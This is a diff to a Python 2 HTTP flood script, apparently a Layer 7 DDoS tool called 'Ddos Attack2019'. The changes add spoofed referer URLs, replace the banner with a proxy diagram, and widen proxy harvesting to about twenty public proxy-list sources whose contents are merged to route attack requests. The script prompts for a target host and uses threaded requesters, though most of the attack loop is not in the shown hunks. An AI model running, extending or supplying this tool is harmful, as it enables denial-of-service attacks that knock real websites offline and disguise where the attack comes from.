@@ -1,6 +1,7 @@
 # -*- coding: utf-8 -*-
 #!/usr/bin/env python2
 #Coded By P3terJ4mes
+#Forbidden to Edit,Mod
 import os
 import sys
 import time
@@ -109,6 +110,7 @@ def getUserAgent():
 def referer_list():
     try :
         global headers_referers
+        headers_referers.append('https://iplookup.flagfox.net/?host=')
         headers_referers.append("https://foradoar.org/")
         headers_referers.append("https://duckduckgo.com/")
         headers_referers.append("https://duckduckgo.com/")
@@ -172,6 +174,7 @@ def referer_list():
         headers_referers.append('http://vk.com/profile.php?redirect=')
         headers_referers.append('http://www.usatoday.com/search/results?q=')
         headers_referers.append('http://engadget.search.aol.com/search?q=query?=query=..')
+        headers_referers.append('https://browsergames2018.com/bestgames/custom/anime/oven/hentai/index.php?country_code=VN&p1=')
         headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882')
         headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925')
         headers_referers.append('http://yandex.ru/yandsearch?text=')
@@ -1420,15 +1423,18 @@ class Requested(threading.Thread):
         
 print \
 """
-            --------- _       _____   ______    _           _      
-            ---  ----! !     ! ____! ! _____!  ! ! _______ ! !
-               ! !   ! !____ ! !___  ! !   ___ ! !!  ___  !! !
-               ! !   !  __  !! ____! ! !  !___!! !! !   ! !! !  
-               ! !   ! !  ! !! !___  ! !____!! ! !! !___! !! !  
-               !_!   !_!  !_!!_____! !______!! !_!!_______!!_!Ddos Layer.7                                        
-
-  !_________________________________________________________________________!
+         
+        +--------+      HTTP                      :80 +----------+
+        | Client |  --------------------------------> |          |
+        |        |         Layer 7 Requests           | ProxyHTTP|
+        +--------+             +---------+            |==========|
+       / Rquests/     HTTPS    |         | HTTP Ports | Listening|==>HOST
+      <________/    ---------> | (Server | ---------> |  ports   |
+                               |  mode)  |            |          |
+                               +---------+            +----------+
+    !_____________________________________________________________________!
 """
+
 print("   ========>>.:.Hello P3terJ4mes,Welcome Ddos Attack2019 WEBSITE.:.<<========")
 print("")
 
@@ -1439,8 +1445,33 @@ if os.name in ('nt', 'dos', 'ce'):
 url = raw_input('[Root@Kali://P3terJ4mes>Host :')
 url_host = url.replace("https://", "").replace("http://", "").replace("www.", "")
 try:
-   in_file = urllib.urlopen('http://multiproxy.org/txt_all/proxy.txt','http://spys.me/proxy.txt')
-   listaproxy = in_file.readlines()
+   #The Proxy HTTP_HTTPS_SOCKS4_SOCKS5 Update Every Time in The Site:
+   in_file = urllib.urlopen('http://spys.me/proxy.txt')
+   in_file19 = urllib.urlopen('https://cyber-hub.net/proxy/socks.txt')
+   in_file18 = urllib.urlopen('http://cyber-hub.net/proxy/http.txt')
+   in_file1 = urllib.urlopen('http://www.proxylists.net/http.txt')
+   in_file2 = urllib.urlopen('http://rootjazz.com/proxies/proxies.txt')
+   in_file3 = urllib.urlopen('http://multiproxy.org/txt_anon/proxy.txt')
+   in_file4 = urllib.urlopen('http://multiproxy.org/txt_all/proxy.txt')
+   in_file5 = urllib.urlopen('http://www.proxylists.net/http_highanon.txt')
+   in_file6 = urllib.urlopen('https://www.proxy-list.download/api/v1/get?type=http')
+   in_file7 = urllib.urlopen('https://www.proxy-list.download/api/v1/get?type=https')
+   in_file8 = urllib.urlopen('http://proxy-ip-list.com/download/free-proxy-list.txt')
+   in_file9 = urllib.urlopen('https://rmccurdy.com/scripts/proxy/socks.txt')
+   in_file10 = urllib.urlopen('https://rmccurdy.com/scripts/proxy/good.txt')
+   in_file11 = urllib.urlopen('https://rmccurdy.com/scripts/proxy/proxylist.txt')
+   in_file12 = urllib.urlopen('http://proxy-ip-list.com/download/free-usa-proxy-ip.txt')
+   in_file13 = urllib.urlopen('http://proxy-ip-list.com/download/free-uk-proxy-list.txt')
+   in_file14 = urllib.urlopen('http://proxy-ip-list.com/download/proxy-list-port-3128.txt')
+   in_file15 = urllib.urlopen('https://www.proxy-list.download/api/v1/get?type=socks4')
+   in_file16 = urllib.urlopen('https://www.proxy-list.download/api/v1/get?type=socks5')
+   in_file17 = urllib.urlopen('https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt')
+   listaproxy0 = in_file.readlines()  + in_file1.readlines()  + in_file2.readlines()  + in_file3.readlines()
+   listaproxy1 = in_file4.readlines()  + in_file5.readlines()  + in_file6.readlines()  + in_file7.readlines()
+   listaproxy2 = in_file8.readlines()  + in_file9.readlines()  + in_file10.readlines()  + in_file11.readlines()  
+   listaproxy3 = in_file12.readlines()  + in_file13.readlines()  + in_file14.readlines()  + in_file15.readlines()  
+   listaproxy4 = in_file16.readlines() + in_file17.readlines() + in_file18.readlines() + in_file19.readlines()
+   listaproxy = listaproxy0 + listaproxy1 + listaproxy2 + listaproxy3 + listaproxy4
 except IOError:
        print("[Root@Kali://P3terJ4mes>Could not open specified Proxy Url.\n")
     
